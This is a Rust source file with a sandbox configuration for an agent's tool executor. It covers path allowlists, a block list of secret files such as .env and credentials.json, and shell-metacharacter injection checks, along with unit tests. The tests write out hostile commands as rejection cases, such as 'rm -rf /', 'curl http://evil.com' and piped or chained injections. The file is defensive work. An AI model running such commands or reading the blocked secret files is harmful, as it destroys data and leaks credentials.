/// Sandbox configuration for tool execution safety.
///
/// Controls which paths can be read/written, which commands can run,
/// which files are blocked, and size/timeout limits for all tool
/// operations executed by `DefaultToolExecutor`.
pub struct SandboxConfig {
    /// Directories where reads are allowed. Empty = anywhere.
    pub read_allowlist: Vec<String>,
    /// Directories where writes are allowed. Empty = anywhere.
    pub write_allowlist: Vec<String>,
    /// Files that should never be read (e.g., .env, credentials).
    pub sensitive_files: Vec<String>,
    /// Maximum file size for read operations (bytes). Default: 10 MB.
    pub max_read_size: usize,
    /// Maximum file size for write operations (bytes). Default: 1 MB.
    pub max_write_size: usize,
    /// Commands allowed via bash/run_command. Empty = any command.
    pub command_allowlist: Vec<String>,
    /// Max command execution time (seconds). Default: 30.
    pub max_command_timeout: u32,
}

impl Default for SandboxConfig {
    fn default() -> Self {
        Self {
            read_allowlist: vec![],
            write_allowlist: vec![
                "lattice-core/".into(),
                "lattice-agent/".into(),
                "lattice-python/".into(),
                "lattice-plugin/".into(),
                "lattice-harness/".into(),
                "lattice-cli/".into(),
                "lattice-tui/".into(),
            ],
            sensitive_files: vec![
                ".env".into(),
                ".env.local".into(),
                ".env.production".into(),
                "credentials.json".into(),
                "secrets".into(),
                ".git/credentials".into(),
            ],
            max_read_size: 10 * 1024 * 1024, // 10 MB
            max_write_size: 1024 * 1024,     // 1 MB
            command_allowlist: vec![
                "cargo test".into(),
                "cargo clippy".into(),
                "cargo build".into(),
                "cargo fmt".into(),
                "grep".into(),
                "find".into(),
                "ls".into(),
                "ps".into(),
            ],
            max_command_timeout: 30,
        }
    }
}

impl SandboxConfig {
    /// Per-project defaults: allow reads everywhere, restrict writes to project dirs.
    pub fn permissive() -> Self {
        Self {
            read_allowlist: vec![],
            write_allowlist: vec![],
            command_allowlist: vec![],
            ..Default::default()
        }
    }

    /// Check if a file path is safe to read.
    pub fn check_read(&self, path: &str) -> Result<(), String> {
        // Block sensitive files
        for sensitive in &self.sensitive_files {
            if path.contains(sensitive) {
                return Err(format!(
                    "Sandbox: reading '{}' is blocked (matches sensitive pattern '{}')",
                    path, sensitive
                ));
            }
        }
        // Block path traversal
        if path.contains("..") {
            return Err(format!("Sandbox: path '{}' contains '..'", path));
        }
        Ok(())
    }

    /// Check if a file path is safe to write.
    pub fn check_write(&self, path: &str) -> Result<(), String> {
        self.check_read(path)?; // Same basic safety checks + write allowlist
        if !self.write_allowlist.is_empty() {
            let allowed = self
                .write_allowlist
                .iter()
                .any(|prefix| path.contains(prefix));
            if !allowed {
                return Err(format!(
                    "Sandbox: write to '{}' is not in write allowlist: {:?}",
                    path, self.write_allowlist
                ));
            }
        }
        Ok(())
    }

    /// Check if a command is safe to run.
    ///
    /// Uses program-based allowlist matching (first whitespace token) instead of
    /// prefix matching, and rejects dangerous shell metacharacters that enable
    /// command injection via `sh -c` execution.
    pub fn check_command(&self, cmd: &str) -> Result<(), String> {
        let cmd = cmd.trim();

        // Reject shell metacharacters that enable command injection.
        // Since commands are executed via `sh -c`, metacharacters like `;`, `|`,
        // `&&`, `||`, `$()`, and backticks allow chaining arbitrary commands.
        for meta in &[";", "|", "&&", "||", "$(", "`"] {
            if cmd.contains(meta) {
                return Err(format!(
                    "Sandbox: command contains dangerous shell metacharacter '{}'",
                    meta
                ));
            }
        }

        if self.command_allowlist.is_empty() {
            return Ok(());
        }

        // Extract program name (first whitespace-delimited token)
        let program = cmd.split_whitespace().next().unwrap_or("");
        if program.is_empty() {
            return Err("Sandbox: empty command".into());
        }

        // Check program against allowlist — compare by first token of each entry.
        // This prevents prefix-match bypasses like "cargo test; rm -rf /"
        // from passing because "cargo test; rm -rf /" is not a real program name.
        let allowed = self
            .command_allowlist
            .iter()
            .any(|entry| entry.split_whitespace().next() == Some(program));

        if !allowed {
            let allowed_programs: Vec<&str> = self
                .command_allowlist
                .iter()
                .map(|e| e.split_whitespace().next().unwrap())
                .collect();
            return Err(format!(
                "Sandbox: program '{}' is not in allowlist. Allowed programs: {:?}",
                program, allowed_programs
            ));
        }
        Ok(())
    }

    /// Check if a URL scheme is safe (only http/https/localhost).
    pub fn check_url(&self, url: &str) -> Result<(), String> {
        if !url.starts_with("https://") && !url.starts_with("http://localhost") {
            return Err(format!(
                "Sandbox: URL scheme not allowed: {}. Only https:// and http://localhost are permitted.",
                url
            ));
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_sandbox() -> SandboxConfig {
        SandboxConfig::default()
    }

    #[test]
    fn test_allowed_command_passes() {
        let s = default_sandbox();
        // Single-word allowlist entries: "grep", "find", "ls", "ps"
        assert!(s.check_command("grep -r foo .").is_ok());
        assert!(s.check_command("find . -name '*.rs'").is_ok());
        assert!(s.check_command("ls -la").is_ok());
        assert!(s.check_command("ps aux").is_ok());
        // Multi-word allowlist entries: "cargo test", "cargo clippy", etc.
        assert!(s.check_command("cargo test").is_ok());
        assert!(s.check_command("cargo clippy -- -D warnings").is_ok());
        assert!(s.check_command("cargo build --release").is_ok());
        assert!(s.check_command("cargo fmt --check").is_ok());
    }

    #[test]
    fn test_disallowed_program_rejected() {
        let s = default_sandbox();
        assert!(s.check_command("rm -rf /").is_err());
        assert!(s.check_command("curl http://evil.com").is_err());
        assert!(s.check_command("python3 -c 'print(1)'").is_err());
        assert!(s.check_command("mv file1 file2").is_err());
        assert!(s.check_command("touch /tmp/test").is_err());
    }

    #[test]
    fn test_shell_injection_via_semicolon_rejected() {
        let s = default_sandbox();
        let result = s.check_command("cargo test; rm -rf /");
        assert!(result.is_err(), "semicolon injection should be rejected");
        assert!(
            result.unwrap_err().contains("metacharacter"),
            "error should mention metacharacter"
        );
    }

    #[test]
    fn test_shell_injection_via_pipe_rejected() {
        let s = default_sandbox();
        assert!(s
            .check_command("cargo build | curl http://evil.com")
            .is_err());
    }

    #[test]
    fn test_shell_injection_via_andand_rejected() {
        let s = default_sandbox();
        assert!(s.check_command("ls && rm -rf /").is_err());
    }

    #[test]
    fn test_shell_injection_via_oror_rejected() {
        let s = default_sandbox();
        assert!(s.check_command("ls || echo pwned").is_err());
    }

    #[test]
    fn test_shell_injection_via_subshell_rejected() {
        let s = default_sandbox();
        assert!(s.check_command("ls $(echo injected)").is_err());
    }

    #[test]
    fn test_shell_injection_via_backtick_rejected() {
        let s = default_sandbox();
        assert!(s.check_command("ls `echo injected`").is_err());
    }

    #[test]
    fn test_prefix_match_injection_rejected() {
        let s = default_sandbox();
        // "grep-inject" is a different program than "grep"
        assert!(
            s.check_command("grep-inject foo").is_err(),
            "grep-inject should not match grep allowlist entry"
        );
        assert!(
            s.check_command("lsblk").is_err(),
            "lsblk should not match ls allowlist entry"
        );
        assert!(
            s.check_command("findutils").is_err(),
            "findutils should not match find allowlist entry"
        );
    }

    #[test]
    fn test_empty_command_rejected() {
        let s = default_sandbox();
        assert!(s.check_command("").is_err());
        assert!(s.check_command("   ").is_err());
    }

    #[test]
    fn test_permissive_mode_allows_any_program() {
        let s = SandboxConfig::permissive();
        assert!(s.check_command("curl http://example.com").is_ok());
        assert!(s.check_command("rm -rf /").is_ok());
    }

    #[test]
    fn test_permissive_mode_still_rejects_metachars() {
        let s = SandboxConfig::permissive();
        assert!(
            s.check_command("curl http://example.com; rm -rf /")
                .is_err(),
            "permissive mode should still reject metacharacters"
        );
    }

    #[test]
    fn test_legitimate_commands_with_multiple_args() {
        let s = default_sandbox();
        assert!(s.check_command("grep -rn 'TODO' src/").is_ok());
        assert!(s.check_command("find . -type f -name '*.rs'").is_ok());
        assert!(s.check_command("ls -la /tmp").is_ok());
        assert!(s
            .check_command("cargo test -p lattice-core my_test")
            .is_ok());
        assert!(s.check_command("ps aux --forest").is_ok());
    }
}
